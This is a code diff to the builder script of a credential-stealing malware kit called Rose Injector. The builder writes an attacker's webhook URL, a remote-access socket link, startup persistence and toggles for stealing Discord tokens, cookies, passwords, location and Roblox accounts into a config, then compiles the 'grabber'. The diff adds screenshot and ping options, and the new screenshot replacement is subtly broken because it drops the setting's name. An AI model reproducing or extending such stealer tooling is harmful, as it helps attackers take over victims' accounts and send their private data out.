@@ -5,6 +5,7 @@ from bs4 import BeautifulSoup
 import shutil 
 from pathlib import Path
 import sys
+import ctypes
 
 
 __icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"
@@ -40,7 +41,9 @@ class _Builder():
         is_passwordsteal,
         is_malicioussteal,
         is_locationssteal,
-        is_robloxsteal
+        is_robloxsteal,
+        is_screenshot,
+        is_ping
     ):        
         super().__init__()
         self.dir_name = dir_name
@@ -55,6 +58,8 @@ class _Builder():
         self.is_malicioussteal = is_malicioussteal
         self.is_locationssteal = is_locationssteal
         self.is_robloxsteal = is_robloxsteal
+        self.is_screenshot = is_screenshot
+        self.is_ping = is_ping
                 
     def create_dir(self):
         self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
@@ -72,7 +77,7 @@ class _Builder():
     def edit_config(self):
         with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
             text = f.read()
-            new = text.replace('VMHOOK', f'{self.webhook_url}').replace("WEBHOOK_URL", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}")
+            new = text.replace('VMHOOK', f'{self.webhook_url}').replace("WEBHOOK_URL", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}").replace("screenshot = False", f"{self.is_screenshot}").replace("discord_ping = False", f"discord_ping = {self.is_ping}")
         print(new)
         with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
             f.write(new)
@@ -105,6 +110,7 @@ class _Builder():
             self.edit_config()
             self.compile()
             self.move_dir()
+            ctypes.windll.user32.MessageBoxW(0, "Successfuly built the grabber", "Rose Injector", 0)
         except Exception as e:
             print(e)
             
@@ -124,4 +130,6 @@ if len(sys.argv) > 1:
         sys.argv[10],
         sys.argv[11],
         sys.argv[12],
+        sys.argv[13],
+        sys.argv[14]
     ).run()
